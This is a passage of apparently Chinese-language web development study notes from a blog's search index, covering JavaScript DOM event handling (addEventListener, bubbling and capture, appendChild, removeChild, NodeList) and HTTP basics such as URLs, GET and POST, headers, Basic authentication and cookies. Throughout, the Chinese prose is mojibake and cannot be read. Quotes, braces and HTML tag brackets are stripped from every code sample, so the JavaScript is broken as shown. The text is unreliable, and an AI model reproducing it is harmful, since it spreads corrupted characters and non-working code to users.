onmouseout=mOut(this)Mouse Over Me/divscriptfunction mOver(obj) obj.innerHTML=Thank Youfunction mOut(obj) obj.innerHTML=Mouse Over Me/script onmousedownã€onmouseup ä»¥åŠ onclick äº‹ä»¶ onmousedown, onmouseup ä»¥åŠ onclick æ„æˆäº†é¼ æ ‡ç‚¹å‡»äº‹ä»¶çš„æ‰€æœ‰éƒ¨åˆ†ã€‚é¦–å…ˆå½“ç‚¹å‡»é¼ æ ‡æŒ‰é’®æ—¶ï¼Œä¼šè§¦å‘ onmousedown äº‹ä»¶ï¼Œå½“é‡Šæ”¾é¼ æ ‡æŒ‰é’®æ—¶ï¼Œä¼šè§¦å‘ onmouseup äº‹ä»¶ï¼Œæœ€åï¼Œå½“å®Œæˆé¼ æ ‡ç‚¹å‡»æ—¶ï¼Œä¼šè§¦å‘ onclick äº‹ä»¶ DOM EventListener addEventListener() æ–¹æ³• pè¯¥å®ä¾‹ä½¿ç”¨ addEventListener() æ–¹æ³•åœ¨æŒ‰é’®ä¸­æ·»åŠ ç‚¹å‡»äº‹ä»¶ã€‚ /pbutton id=myBtnç‚¹æˆ‘/buttonp id=demo/pscriptdocument.getElementById(myBtn).addEventListener(click, displayDate);function displayDate() document.getElementById(demo).innerHTML = Date();/script è¯­æ³• element.addEventListener(event, function, useCapture); ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯äº‹ä»¶çš„ç±»å‹ (å¦‚ â€œclickâ€ æˆ– â€œmousedownâ€). ç¬¬äºŒä¸ªå‚æ•°æ˜¯äº‹ä»¶è§¦å‘åè°ƒç”¨çš„å‡½æ•°ã€‚ ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸ªå¸ƒå°”å€¼ç”¨äºæè¿°äº‹ä»¶æ˜¯å†’æ³¡è¿˜æ˜¯æ•è·ã€‚è¯¥å‚æ•°æ˜¯å¯é€‰çš„ã€‚ å‘åŸå…ƒç´ æ·»åŠ äº‹ä»¶å¥æŸ„ å¦‚å½“ç”¨æˆ·ç‚¹å‡»å…ƒç´ æ—¶å¼¹å‡º â€œHello World!â€ ï¼š pè¯¥å®ä¾‹ä½¿ç”¨ addEventListener() æ–¹æ³•åœ¨æŒ‰é’®ä¸­æ·»åŠ ç‚¹å‡»äº‹ä»¶ã€‚ /pbutton id=myBtnç‚¹æˆ‘/buttonscriptdocument.getElementById(myBtn).addEventListener(click, function() alert(Hello World!););/script å‘åŒä¸€ä¸ªå…ƒç´ ä¸­æ·»åŠ å¤šä¸ªäº‹ä»¶å¥æŸ„ addEventListener() æ–¹æ³•å…è®¸å‘åŒä¸€ä¸ªå…ƒç´ æ·»åŠ å¤šä¸ªäº‹ä»¶ï¼Œä¸”ä¸ä¼šè¦†ç›–å·²å­˜åœ¨çš„äº‹ä»¶ï¼š pè¯¥å®ä¾‹ä½¿ç”¨ addEventListener() æ–¹æ³•å‘åŒä¸ªæŒ‰é’®ä¸­æ·»åŠ ä¸¤ä¸ªç‚¹å‡»äº‹ä»¶ã€‚/pbutton id=myBtnç‚¹æˆ‘/buttonscriptvar x = document.getElementById(myBtn);x.addEventListener(click, myFunction);x.addEventListener(click, someOtherFunction);function myFunction() alert (Hello World!)function someOtherFunction() alert (å‡½æ•°å·²æ‰§è¡Œ!)/script ä½ å¯ä»¥å‘åŒä¸ªå…ƒç´ æ·»åŠ ä¸åŒç±»å‹çš„äº‹ä»¶ï¼š på®ä¾‹ä½¿ç”¨ addEventListener() æ–¹æ³•åœ¨åŒä¸€ä¸ªæŒ‰é’®ä¸­æ·»åŠ å¤šä¸ªäº‹ä»¶ã€‚/pbutton id=myBtnç‚¹æˆ‘/buttonp id=demo/pscriptvar x = document.getElementById(myBtn);x.addEventListener(mouseover, myFunction);x.addEventListener(click, mySecondFunction);x.addEventListener(mouseout, myThirdFunction);function myFunction() document.getElementById(demo).innerHTML += Moused over!brfunction mySecondFunction() document.getElementById(demo).innerHTML += Clicked!brfunction myThirdFunction() document.getElementById(demo).innerHTML += Moused out!br/script å‘ Window å¯¹è±¡æ·»åŠ äº‹ä»¶å¥æŸ„ å½“ç”¨æˆ·é‡ç½®çª—å£å¤§å°æ—¶æ·»åŠ äº‹ä»¶ç›‘å¬ï¼š window.addEventListener(resize, function() document.getElementById(demo).innerHTML = sometext;); äº‹ä»¶å†’æ³¡æˆ–äº‹ä»¶æ•è· äº‹ä»¶ä¼ é€’æœ‰ä¸¤ç§æ–¹å¼ï¼šå†’æ³¡ä¸æ•è· äº‹ä»¶ä¼ é€’å®šä¹‰äº†å…ƒç´ äº‹ä»¶è§¦å‘çš„é¡ºåº å°† p å…ƒç´ æ’å…¥åˆ° div å…ƒç´ ä¸­ï¼Œç”¨æˆ·ç‚¹å‡» p å…ƒç´ ï¼š åœ¨ å†’æ³¡ ä¸­ï¼Œå†…éƒ¨å…ƒç´ çš„äº‹ä»¶ä¼šå…ˆè¢«è§¦å‘ï¼Œç„¶åå†è§¦å‘å¤–éƒ¨å…ƒç´ ï¼Œå³ï¼š p å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶å…ˆè§¦å‘ï¼Œç„¶åä¼šè§¦å‘ div å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶ã€‚ åœ¨ æ•è· ä¸­ï¼Œå¤–éƒ¨å…ƒç´ çš„äº‹ä»¶ä¼šå…ˆè¢«è§¦å‘ï¼Œç„¶åæ‰ä¼šè§¦å‘å†…éƒ¨å…ƒç´ çš„äº‹ä»¶ï¼Œå³ï¼š div å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶å…ˆè§¦å‘ ï¼Œç„¶åå†è§¦å‘ p å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶ã€‚ addEventListener() æ–¹æ³•å¯ä»¥æŒ‡å®š â€œuseCaptureâ€ å‚æ•°æ¥è®¾ç½®ä¼ é€’ç±»å‹ï¼š addEventListener(event, function, useCapture); é»˜è®¤å€¼ä¸º false, å³å†’æ³¡ä¼ é€’ï¼Œå½“å€¼ä¸º true æ—¶, äº‹ä»¶ä½¿ç”¨æ•è·ä¼ é€’ på®ä¾‹æ¼”ç¤ºäº†åœ¨æ·»åŠ ä¸åŒäº‹ä»¶ç›‘å¬æ—¶ï¼Œå†’æ³¡ä¸æ•è·çš„ä¸åŒã€‚/pdiv id=myDiv p id=myPç‚¹å‡»æ®µè½ï¼Œæˆ‘æ˜¯å†’æ³¡ã€‚/p/divbrdiv id=myDiv2 p id=myP2ç‚¹å‡»æ®µè½ï¼Œæˆ‘æ˜¯æ•è·ã€‚ /p/divscript!--å†’æ³¡--document.getElementById(myP).addEventListener(click, function() alert(ä½ ç‚¹å‡»äº† P å…ƒç´ !);, false);document.getElementById(myDiv).addEventListener(click, function() alert( ä½ ç‚¹å‡»äº† DIV å…ƒç´  !);, false);!--æ•è·--document.getElementById(myP2).addEventListener(click, function() alert(ä½ ç‚¹å‡»äº† P2 å…ƒç´ !);, true);document.getElementById(myDiv2).addEventListener(click, function() alert(ä½ ç‚¹å‡»äº† DIV2 å…ƒç´  !);, true);/script removeEventListener() æ–¹æ³• removeEventListener() æ–¹æ³•ç§»é™¤ç”± addEventListener() æ–¹æ³•æ·»åŠ çš„äº‹ä»¶å¥æŸ„: HTML DOM äº‹ä»¶å¯¹è±¡å‚è€ƒæ‰‹å†Œ DOM å…ƒç´  åˆ›å»ºæ–°çš„ HTML å…ƒç´  (èŠ‚ç‚¹) è¦åˆ›å»ºæ–°çš„ HTML å…ƒç´  (èŠ‚ç‚¹)éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªå…ƒç´ ï¼Œç„¶ååœ¨å·²å­˜åœ¨çš„å…ƒç´ ä¸­æ·»åŠ å®ƒ appendChild() æ˜¯ JavaScript ä¸­ç”¨äºå°†ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆå…ƒç´ æˆ–æ–‡æœ¬èŠ‚ç‚¹ï¼‰è¿½åŠ åˆ°æŒ‡å®šçˆ¶èŠ‚ç‚¹çš„æœ€åä¸€ä¸ªå­èŠ‚ç‚¹ä½ç½®çš„æ–¹æ³• div id=div1 !-- è¿™æ˜¯çˆ¶å…ƒç´  -- p id=p1è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚/p p id=p2è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚/p/divscript // 1. æ‰¾åˆ°çˆ¶å…ƒç´  div1 var parentElement = document.getElementById(div1); // 2. åˆ›å»ºä¸€ä¸ªæ–°çš„å­å…ƒç´  p var childElement = document.createElement(p); // 3. åˆ›å»ºå­å…ƒç´ ä¸­çš„æ–‡æœ¬å†…å®¹ var childText = document.createTextNode(è¿™æ˜¯ä¸€ä¸ªæ–°çš„æ®µè½ã€‚); // 4. å°†æ–‡æœ¬å†…å®¹æ”¾å…¥å­å…ƒç´ ä¸­ childElement.appendChild(childText); // 5. å°†å­å…ƒç´ æ·»åŠ åˆ°çˆ¶å…ƒç´ ä¸­ parentElement.appendChild(childElement);/script insertBefore() ç”¨äºåœ¨æŒ‡å®šçš„çˆ¶å…ƒç´ ä¸­ï¼Œå°†ä¸€ä¸ªæ–°èŠ‚ç‚¹æ’å…¥åˆ°æŸä¸ªå·²å­˜åœ¨çš„å­èŠ‚ç‚¹ä¹‹å‰ div id=div1 p id=p1è¿™æ˜¯ç¬¬ä¸€ä¸ªæ®µè½ã€‚/p p id=p2è¿™æ˜¯ç¬¬äºŒä¸ªæ®µè½ã€‚/p/divscript // è·å–çˆ¶å…ƒç´  div1 var parentElement = document.getElementById(div1); // åˆ›å»ºä¸€ä¸ªæ–°çš„æ®µè½èŠ‚ç‚¹ var newParagraph = document.createElement(p); newParagraph.innerText = è¿™æ˜¯ä¸€ä¸ªæ–°æ’å…¥çš„æ®µè½ã€‚; // æ‰¾åˆ°å‚è€ƒèŠ‚ç‚¹ï¼ˆp1ï¼‰ var referenceNode = document.getElementById(p1); // å°†æ–°æ®µè½æ’å…¥åˆ° p1 ä¹‹å‰ parentElement.insertBefore(newParagraph, referenceNode);/script ç§»é™¤å·²å­˜åœ¨çš„å…ƒç´  HTML æ–‡æ¡£ä¸­ div å…ƒç´ åŒ…å«ä¸¤ä¸ªå­èŠ‚ç‚¹ (ä¸¤ä¸ª p å…ƒç´ ): div id=div1p id=p1è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚/pp id=p2è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚/p/div æŸ¥æ‰¾ id=â€œdiv1â€ çš„å…ƒç´ : var parent = document.getElementById(div1); æŸ¥æ‰¾ id=â€œp1â€ çš„ p å…ƒç´ : var child = document.getElementById(p1); ä»çˆ¶å…ƒç´ ä¸­ç§»é™¤å­èŠ‚ç‚¹ï¼š parent.removeChild(child); [!CAUTION] åˆ é™¤èŠ‚ç‚¹å¿…é¡»çŸ¥é“çˆ¶èŠ‚ç‚¹ æ›¿æ¢ HTML å…ƒç´  - replaceChild() div id=div1p id=p1è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚/pp id=p2è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚/p/div scriptvar para = document.createElement(p);var node = document.createTextNode(è¿™æ˜¯ä¸€ä¸ªæ–°çš„æ®µè½ã€‚);para.appendChild(node); var parent = document.getElementById(div1);var child = document.getElementById(p1);parent.replaceChild(para, child);/script HTML DOM é›†åˆ HTML Collection å¯¹è±¡ getElementsByTagName() æ–¹æ³•è¿”å› HTMLCollectionå¯¹è±¡ã€‚ HTMLCollection å¯¹è±¡ç±»ä¼¼åŒ…å« HTML å…ƒç´ çš„ä¸€ä¸ªæ•°ç»„ã€‚ var x = document.getElementsByTagName(p); é›†åˆä¸­çš„å…ƒç´ å¯ä»¥é€šè¿‡ç´¢å¼•(ä»¥ 0 ä¸ºèµ·å§‹ä½ç½®)æ¥è®¿é—®ã€‚è®¿é—®ç¬¬äºŒä¸ª p å…ƒç´ å¯ä»¥æ˜¯ä»¥ä¸‹ä»£ç :y = x[1]; [!NOTE] HTMLCollection ä¸æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ ä½†å¯ä»¥åƒæ•°ç»„ä¸€æ ·ï¼Œä½¿ç”¨ç´¢å¼•æ¥è·å–å…ƒç´  HTML Collection å¯¹è±¡ .length å±æ€§ length å±æ€§å®šä¹‰äº†é›†åˆä¸­å…ƒç´ çš„æ•°é‡ è·å– p å…ƒç´ çš„é›†åˆï¼š var myCollection = document.getElementsByTagName(p); æ˜¾ç¤ºé›†åˆå…ƒç´ ä¸ªæ•°ï¼š document.getElementById(demo).innerHTML = myCollection.length; é›†åˆ length å±æ€§å¸¸ç”¨äºéå†é›†åˆä¸­çš„å…ƒç´ ã€‚ NodeList å¯¹è±¡ NodeList å¯¹è±¡æ˜¯ä¸€ä¸ªä»æ–‡æ¡£ä¸­è·å–çš„èŠ‚ç‚¹åˆ—è¡¨ (é›†åˆ) [!CAUTION] HTML Collectionæ˜¯ HTML å…ƒç´ çš„é›†åˆã€‚ NodeList æ˜¯ä¸€ä¸ªæ–‡æ¡£èŠ‚ç‚¹çš„é›†åˆã€‚ NodeList ä¸ HTMLCollection éƒ½ä¸æ•°ç»„å¯¹è±¡æœ‰ç‚¹ç±»ä¼¼ï¼Œå¯ä»¥ä½¿ç”¨ç´¢å¼• (0, 1, 2, 3, 4, â€¦) æ¥è·å–å…ƒç´ ã€‚ NodeList ä¸ HTMLCollection éƒ½æœ‰ length å±æ€§ã€‚ HTMLCollection å…ƒç´ å¯ä»¥é€šè¿‡ nameï¼Œid æˆ–ç´¢å¼•æ¥è·å–ã€‚ NodeList åªèƒ½é€šè¿‡ç´¢å¼•æ¥è·å–ã€‚ åªæœ‰ NodeList å¯¹è±¡æœ‰åŒ…å«å±æ€§èŠ‚ç‚¹å’Œæ–‡æœ¬èŠ‚ç‚¹ã€‚","tags":["å‰ç«¯","JavaScript","DOM"],"categories":["å‰ç«¯"]},{"title":"HTTP","path":"/2025/07/09/HTTP/","content":"HTTP HTTPæ¦‚è¿° HTTP æ˜¯ä¸€ç§ç”¨ä½œè·å–è¯¸å¦‚ HTML æ–‡æ¡£è¿™ç±»èµ„æºçš„åè®®ï¼ˆTTP æ˜¯ä¸€ç§åº”ç”¨å±‚çš„åè®®ï¼Œé€šè¿‡ TCP æˆ– TLSï¼ˆä¸€ç§åŠ å¯†è¿‡çš„ TCP è¿æ¥ï¼‰æ¥å‘é€ï¼‰ã€‚å®ƒæ˜¯ Web ä¸Šè¿›è¡Œä»»ä½•æ•°æ®äº¤æ¢çš„åŸºç¡€ï¼Œä¹Ÿæ˜¯ä¸€ç§å®¢æˆ·ç«¯â€”æœåŠ¡å™¨ï¼ˆclient-serverï¼‰åè®® HTTPè¯·æ±‚åŒ…çš„ç»“æ„ è¯·æ±‚è¡Œ URL ï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰æ˜¯å› ç‰¹ç½‘ä¸­çš„å”¯ä¸€èµ„æºçš„åœ°å€ã€‚å®ƒæ˜¯æµè§ˆå™¨ç”¨äºæ£€ç´¢å·²å‘å¸ƒèµ„æºï¼ˆä¾‹å¦‚ HTML é¡µé¢ã€CSS æ–‡æ¡£ã€å›¾åƒç­‰ï¼‰çš„å…³é”®æœºåˆ¶ä¹‹ä¸€ URLåŸºæœ¬å†…å®¹ åè®®ï¼ˆschemeï¼‰ HTTPS ã€ HTTPã€FTP æƒå¨ï¼ˆauthorityï¼‰ æƒå¨åŒ…æ‹¬åŸŸåï¼ˆä¾‹å¦‚ www.example.comï¼‰å’Œç«¯å£ï¼ˆ80ï¼‰ï¼Œç”±å†’å·åˆ†éš” æ³¨ï¼šé‚®ä»¶å®¢æˆ·ç«¯ï¼ˆmailto:foobarï¼‰ä¸ä½¿ç”¨æƒå¨ï¼ˆå…¶åŒ…å«æ–¹æ¡ˆï¼‰ è·¯å¾„ï¼ˆPathï¼‰ /path/to/myfile.html ã€/index.htmlæ˜¯ Web æœåŠ¡å™¨ä¸Šèµ„æºçš„è·¯å¾„ å‚æ•°ï¼ˆParametersï¼‰ ?key1=value1key2=value2 æ˜¯æä¾›ç»™ Web æœåŠ¡å™¨çš„é¢å¤–å‚æ•°(å‚æ•°æ˜¯ç”¨ ç¬¦å·åˆ†éš”çš„é”®/å€¼å¯¹åˆ—è¡¨) é”šç‚¹ï¼ˆAnchorï¼‰ #SomewhereInTheDocument æ˜¯èµ„æºæœ¬èº«çš„å¦ä¸€éƒ¨åˆ†çš„é”šç‚¹ é”šç‚¹è¡¨ç¤ºèµ„æºä¸­çš„ä¸€ç§â€œä¹¦ç­¾â€ï¼Œç»™æµè§ˆå™¨æ˜¾ç¤ºä½äºè¯¥â€œåŠ ä¹¦ç­¾â€ä½ç½®çš„å†…å®¹çš„æ–¹å‘ # åé¢çš„éƒ¨åˆ†ï¼ˆä¹Ÿç§°ä¸ºç‰‡æ®µæ ‡è¯†ç¬¦ï¼‰ä¸ä¼šéšè¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ ä¸€äº›URL æ•°æ®URLï¼šä»¥ data: æ–¹æ¡ˆä¸ºå‰ç¼€çš„ URLï¼Œå…è®¸å†…å®¹åˆ›å»ºè€…åœ¨æ–‡æ¡£ä¸­åµŒå…¥å°æ–‡ä»¶ æ³¨ï¼šURL ç¼–ç ä½¿ç”¨ â€œ%â€ å…¶åè·Ÿéšä¸¤ä½çš„åå…­è¿›åˆ¶æ•°æ¥æ›¿æ¢é ASCII å­—ç¬¦ã€‚ URL ä¸èƒ½åŒ…å«ç©ºæ ¼ã€‚URL ç¼–ç é€šå¸¸ä½¿ç”¨ + æ¥æ›¿æ¢ç©ºæ ¼ã€‚ è¯·æ±‚æ–¹å¼ è¯·æ±‚æ–¹å¼ï¼š GETå’ŒPOST get è¯·æ±‚ GET è¯·æ±‚ä¸»è¦ç”¨äºä»æœåŠ¡å™¨è·å–æ•°æ®ï¼Œå¸¸ç”¨äºè·å–é™æ€èµ„æºï¼ˆç½‘é¡µã€å›¾ç‰‡ã€æ–‡ä»¶ç­‰ï¼‰ getè¯·æ±‚çš„å‚æ•°ä¼ é€’æ–¹å¼ åœ¨ HTTP è¯·æ±‚ä¸­ï¼ŒGET è¯·æ±‚å¯ä»¥é€šè¿‡ URL å‚æ•°æˆ–è€…è¯·æ±‚ä½“çš„æ–¹å¼ä¼ é€’å‚æ•°ã€‚ URL å‚æ•°ï¼šGET è¯·æ±‚å¯ä»¥é€šè¿‡ URL ä¸­æŒ‡å®šçš„ key-value å½¢å¼ä¼ é€’å‚æ•°ã€‚ http://example.com/search?q=testpage=2 ï¼Ÿå key= value postè¯·æ±‚ POST è¯·æ±‚ä¸»è¦ç”¨äºå‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼Œé€šå¸¸ç”¨äºåˆ›å»ºã€æ›´æ–°æˆ–åˆ é™¤èµ„æºã€ä¸Šä¼ æ–‡ä»¶ã€å‘é€ JSON æ•°æ® postè¯·æ±‚çš„å‚æ•°ä¼ é€’æ–¹å¼ï¼šURL å‚æ•°å’Œè¯·æ±‚ä½“ã€‚ 1.URL å‚æ•°ï¼šPOST è¯·æ±‚å¯ä»¥é€šè¿‡ URL ä¸­æŒ‡å®šçš„ key-value å½¢å¼ä¼ é€’å‚æ•°ã€‚ä¾‹å¦‚ï¼Œåœ¨è®¿é—®å¦‚ä¸‹ URL æ—¶ï¼š http://example.com/search?q=testpage=2 2.è¯·æ±‚ä½“ï¼ˆä»…é€‚ç”¨äº POSTã€PUTã€PATCH è¯·æ±‚ï¼‰ï¼šå½“ POSTã€PUT æˆ– PATCH è¯·æ±‚çš„ URL ä¸­æ²¡æœ‰æŒ‡å®šå‚æ•°æ—¶ï¼Œå‚æ•°ä¼šè¢«æ”¾ç½®åœ¨è¯·æ±‚ä½“ä¸­ã€‚è¯·æ±‚ä½“ä¸­çš„æ•°æ®å¯ä»¥æ˜¯è¡¨å•æ•°æ®ã€JSON æ•°æ®ç­‰ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ POST è¯·æ±‚å°† JSON æ•°æ®å‘é€åˆ°å¦‚ä¸‹ URL æ—¶ï¼š http://example.com/users è¯·æ±‚ä½“ä¸­çš„ JSON æ•°æ®å¦‚ä¸‹ï¼š name: John Doe, email: john.doe@example.com getå’ŒpoståŒºåˆ« get å’Œ post è¯·æ±‚çš„ä½¿ç”¨åœºæ™¯ get è·å–æ•°æ®ï¼šGET è¯·æ±‚é€‚åˆç”¨äºä»æœåŠ¡å™¨è·å–æ•°æ®ï¼Œä¾‹å¦‚è·å–ç½‘é¡µå†…å®¹ã€æŸ¥è¯¢æ•°æ®åº“ã€è·å–èµ„æºæ–‡ä»¶ç­‰ã€‚ç”±äº GET è¯·æ±‚çš„å‚æ•°ä¼šæ˜¾ç¤ºåœ¨ URL ä¸­ï¼Œå› æ­¤å®ƒé€‚ç”¨äºä¸éœ€è¦ä¿å¯†çš„å‚æ•°ä¼ é€’ã€‚ ç¼“å­˜å‹å¥½ï¼šGET è¯·æ±‚çš„å“åº”å¯ä»¥è¢«ç¼“å­˜ï¼Œè¿™å¯¹äºä¸€äº›é™æ€èµ„æºçš„è·å–éå¸¸æœ‰ç›Šï¼Œå¯ä»¥æé«˜æ€§èƒ½å’Œå‡å°‘æœåŠ¡å™¨è´Ÿè½½ã€‚ é“¾æ¥å¯¼èˆªï¼šGET è¯·æ±‚å¯ä»¥ç”¨äºåœ¨æµè§ˆå™¨ä¸­è¿›è¡Œé“¾æ¥å¯¼èˆªï¼Œé€šè¿‡åœ¨ URL ä¸­ä¼ é€’å‚æ•°æ¥æŒ‡å®šè¦å¯¼èˆªåˆ°çš„é¡µé¢æˆ–èµ„æºã€‚ post æäº¤æ•°æ®ï¼šPOST è¯·æ±‚é€‚åˆç”¨äºå‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼Œä¾‹å¦‚æäº¤è¡¨å•ã€ä¸Šä¼ æ–‡ä»¶ç­‰ã€‚ç”±äº POST è¯·æ±‚çš„å‚æ•°ä¸ä¼šæ˜¾ç¤ºåœ¨ URL ä¸­ï¼Œå› æ­¤å®ƒé€‚ç”¨äºä¼ é€’æ•æ„Ÿæ•°æ®æˆ–å¤§é‡å‚æ•°ã€‚ åˆ›å»ºèµ„æºï¼šPOST è¯·æ±‚å¯ä»¥ç”¨äºåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºæ–°çš„èµ„æºï¼Œä¾‹å¦‚åˆ›å»ºæ–°çš„ç”¨æˆ·ã€å‘å¸ƒæ–°çš„æ–‡ç« ç­‰ã€‚ æ‰§è¡Œéå¹‚ç­‰æ“ä½œï¼šPOST è¯·æ±‚æ˜¯éå¹‚ç­‰çš„ï¼Œæ„å‘³ç€å¤šæ¬¡å‘é€ç›¸åŒçš„ POST è¯·æ±‚å¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„ç»“æœã€‚è¿™é€‚ç”¨äºä¸€äº›éœ€è¦æ‰§è¡Œä¸å¯é‡å¤æ“ä½œçš„åœºæ™¯ï¼Œä¾‹å¦‚è®¢å•æ”¯ä»˜ã€å¯†ç ä¿®æ”¹ç­‰ã€‚ åŠ é”®å€¼å¯¹æ—¶getåœ¨urlä¸­ï¼Ÿa=1 poståœ¨è¯·æ±‚ä½“ä¸­a=11 è¯·æ±‚å¤´åŠå…¶å†…å®¹ å¸¸è§çš„è¯·æ±‚å¤´åŠä½œç”¨ Hostï¼ŒRefererï¼ŒUser-Agentï¼ŒCookieï¼ŒContent-Typeï¼ŒX-Forwarded-For æ³¨ï¼šPOST è¯·æ±‚ï¼ˆåŒ…å« HTML è¡¨å•æ•°æ®ï¼‰éœ€è¦ä¸»ä½“ ä¸»ä½“å¤§è‡´å¯åˆ†ä¸ºä¸¤ç±»ï¼š *å•ä¸€èµ„æºï¼ˆSingle-resourceï¼‰ä¸»ä½“ï¼Œç”±ä¸€ä¸ªå•æ–‡ä»¶ç»„æˆã€‚è¯¥ç±»å‹çš„ä¸»ä½“ç”±ä¸¤ä¸ªæ ‡å¤´å®šä¹‰ï¼šContent-Typeå’ŒContent-Length å¤šèµ„æºï¼ˆMultiple-resourceï¼‰ä¸»ä½“ï¼Œç”±å¤šéƒ¨åˆ†ä¸»ä½“ç»„æˆï¼Œæ¯ä¸€éƒ¨åˆ†åŒ…å«ä¸åŒçš„ä¿¡æ¯ä½ã€‚é€šå¸¸æ˜¯å’Œ HTML è¡¨å•è¿ç³»åœ¨ä¸€èµ·ã€‚ Hostï¼šæŒ‡å®šè¯·æ±‚çš„æœåŠ¡å™¨çš„åŸŸåå’Œç«¯å£å·ã€‚ User-Agentï¼šåŒ…å«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä»£ç†ï¼ˆæµè§ˆå™¨ï¼‰çš„ä¿¡æ¯ï¼Œå¯ç”¨æ¥æµè§ˆå™¨ä¼ªé€ ã€‚ ä¸€ä¸ªå…¸å‹çš„ User-Agent å­—ç¬¦ä¸²å¯èƒ½çœ‹èµ·æ¥åƒè¿™æ ·ï¼š User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 è¿™ä¸ªå­—ç¬¦ä¸²åŒ…å«äº†ä»¥ä¸‹ä¿¡æ¯ï¼š æµè§ˆå™¨ï¼šMozilla/5.0 æ“ä½œç³»ç»Ÿï¼šWindows NT 10.0 å¹³å°ï¼šWin64; x64 æµè§ˆå™¨æ ¸å¿ƒï¼šAppleWebKit/537.36 æµè§ˆå™¨åç§°ï¼šChrome æµè§ˆå™¨ç‰ˆæœ¬ï¼š58.0.3029.110 æ¸²æŸ“å¼•æ“ï¼šSafari/537.36 Acceptï¼šæŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿå¤„ç†çš„åª’ä½“ç±»å‹ã€‚ Accept-Languageï¼šæŒ‡å®šå®¢æˆ·ç«¯åå¥½çš„è¯­è¨€ã€‚ Accept-Encodingï¼šæŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿå¤„ç†çš„å‹ç¼©ç®—æ³•ã€‚ Authorizationï¼šç”¨äºèº«ä»½éªŒè¯çš„å‡­è¯ã€‚ [!IMPORTANT] HTTP åŸºæœ¬è®¤è¯ é€šè¿‡åœ¨è¯·æ±‚å¤´ (Authorization å¤´) ä¸­å‘é€ç”¨æˆ·åå’Œå¯†ç æ¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚ç”¨æˆ·åå’Œå¯†ç ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰ä¼šç»è¿‡ Base64 ç¼–ç ï¼Œä½† ä¸ä¼šåŠ å¯† å®¢æˆ·ç«¯æä¾›ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶åœ¨ Authorization å¤´ä¸­å‘é€ï¼š Authorization: Basic Base64ç¼–ç çš„ç”¨æˆ·å:å¯†ç  Cookieï¼šCookie æ˜¯ä¸€ç§æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æœ¬åœ°çš„æ•°æ®ã€‚å®ƒç”¨äºè·Ÿè¸ªå’Œè¯†åˆ«ç”¨æˆ·ä¼šè¯ï¼Œå­˜å‚¨ç”¨æˆ·çš„åå¥½è®¾ç½®ã€‚ åŸºæœ¬æ¦‚å¿µ ä¼šè¯Cookieï¼šåªåœ¨æµè§ˆå™¨ä¼šè¯æœŸé—´æœ‰æ•ˆï¼Œå½“ç”¨æˆ·å…³é—­æµè§ˆå™¨æ—¶ï¼Œè¿™äº›Cookieå°±ä¼šè¢«åˆ é™¤ã€‚æµè§ˆå™¨å®šä¹‰äº†â€œå½“å‰ä¼šè¯â€ç»“æŸçš„æ—¶é—´ï¼Œä¸€äº›æµè§ˆå™¨é‡å¯æ—¶ä¼šä½¿ç”¨ä¼šè¯æ¢å¤ã€‚è¿™å¯èƒ½å¯¼è‡´ä¼šè¯ cookie æ— é™å»¶é•¿ã€‚ æŒä¹…Cookieï¼šåœ¨è¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æŒ‡å®šçš„æ—¥æœŸæˆ–æœ‰æ•ˆæœŸï¼ˆMax-Ageï¼‰æŒ‡å®šçš„ä¸€æ®µæ—¶é—´åè¢«åˆ é™¤ã€‚ ç¤ºä¾‹ å‡è®¾æœåŠ¡å™¨æƒ³è¦è®¾ç½®ä¸€ä¸ªCookieï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š Set-Cookie: sessionId=abc123; Expires=Wed, 09 Jun 2024 10:18:14 GMT; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š sessionId=abc123 æ˜¯Cookieçš„åç§°-å€¼å¯¹ï¼ˆå­˜å‚¨åœ¨Cookieä¸­çš„æ•°æ®ï¼‰ Expires=Wed, 09 Jun 2024 10:18:14 GMT å®šä¹‰äº†Cookieçš„è¿‡æœŸæ—¶é—´ã€‚ax-Ageå±æ€§æŒ‡å®šä¸€ä¸ªç›¸å¯¹äºåˆ›å»ºæ—¶çš„æ—¶é—´é•¿åº¦ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ Domain=example.com æŒ‡å®šäº†Cookieçš„æœ‰æ•ˆåŸŸåï¼ˆå“ªäº›åŸŸåä¸‹çš„é¡µé¢è¯·æ±‚å¯ä»¥åŒ…å«è¿™ä¸ªCookieï¼‰å¦‚æœæœªæŒ‡å®šï¼Œé»˜è®¤ä¸ºåˆ›å»ºCookieçš„æœåŠ¡å™¨çš„åŸŸå Path=/ æŒ‡å®šäº†Cookieçš„æœ‰æ•ˆè·¯å¾„ã€‚ Secure 